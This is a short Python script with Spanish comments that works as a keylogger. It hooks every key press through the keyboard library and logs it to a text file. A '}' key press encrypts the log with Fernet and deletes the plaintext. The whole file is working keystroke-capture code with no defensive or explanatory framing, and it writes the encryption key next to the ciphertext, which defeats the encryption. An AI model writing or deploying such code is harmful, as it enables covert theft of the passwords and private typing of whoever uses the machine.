import keyboard
from cryptography.fernet import Fernet
import os



archivo = open("archivo.txt", "w")


def on_key(event):
    if event.name == '}': 
         archivo.close()
         encriptar()
         print('encriptar y borrar')
  
        
        
    if archivo.closed:
        print('archivo cerrado' , event.name)
    else:
        print('Tecla presionada:', event.name)
        archivo.write(event.name)
   




def encriptar():
    
    # Generar una clave de cifrado
    print('# Generar una clave de cifrado')
    clave = Fernet.generate_key()

    # Crear un objeto Fernet con la clave generada
    cipher_suite = Fernet(clave)
    # key = open("key.txt", "wb")
    with open("key.txt", "wb") as archivo_clave:
        archivo_clave.write(clave)
    # key.write(clave)
    
    with open("archivo.txt", "rb") as archivo:
        contenido = archivo.read()
    contenido_encriptado = cipher_suite.encrypt(contenido)

    with open("archivo_encriptado.txt", "wb") as archivo_encriptado:
        archivo_encriptado.write(clave)
        archivo_encriptado.write(contenido_encriptado)

    borrar_archivo_base()

def borrar_archivo_base():
    ruta_archivo="archivo.txt"
    if os.path.isfile(ruta_archivo):
        os.remove(ruta_archivo)

keyboard.on_press(on_key)

keyboard.wait('esc')  # Espera hasta que se presione la tecla 'esc'


